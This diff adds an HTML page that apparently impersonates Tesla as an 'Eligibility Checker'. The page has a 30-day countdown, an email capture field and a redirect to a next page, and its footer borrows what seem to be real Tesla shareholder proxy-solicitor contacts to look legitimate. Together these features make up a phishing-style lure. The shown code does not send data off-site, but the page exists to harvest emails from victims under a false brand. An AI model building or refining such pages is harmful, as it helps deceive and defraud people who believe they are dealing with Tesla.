@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Tesla Eligibility Checker</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="timer" id="timer">Time Remaining: 30 Days</div>
+
+    <h1>Tesla Eligibility Checker</h1>
+
+    <input type="email" id="email" placeholder="Submit Your Email Address" />
+    <button id="verifyBtn">Verify Eligibility Status</button>
+
+    <script>
+        const emailInput = document.getElementById('email');       // matches HTML input id
+        const submitBtn = document.getElementById('verifyBtn');    // matches HTML button id
+      
+        // Function to validate email
+        function isValidEmail(email) {
+          const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+          return regex.test(email);
+        }
+      
+        // Enable or disable button based on email validity
+        emailInput.addEventListener('input', () => {
+          if (isValidEmail(emailInput.value)) {
+            submitBtn.disabled = false;
+          } else {
+            submitBtn.disabled = true;
+          }
+        });
+      
+        // Optional: Prevent navigation if invalid
+        submitBtn.addEventListener('click', (e) => {
+          if (!isValidEmail(emailInput.value)) {
+            e.preventDefault();
+            alert("Please enter a valid email address.");
+          } else {
+            // Redirect to next page if valid
+            window.location.href = 'nextpage.html'; // replace with your next screen
+          }
+        });
+      </script>
+      
+
+    <!-- Footer Section -->
+    <div class="footer">
+      <h3>Questions?</h3>
+      <p>If you need help voting your shares or have any questions, please contact our proxy solicitor, Innisfree M&A Incorporated.</p>
+
+      <div class="footer-cards">
+        <div class="footer-card">
+          <h4>Shareholders</h4>
+          <p>+1 (877) 717-3936 (U.S. and Canada)</p>
+          <p>+1 (412) 232-3651 (all other countries</p>
+        </div>
+        <div class="footer-card">
+          <h4>Banks and Brokers</h4>
+          <p>+1 (212) 750-5833 (collect)</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
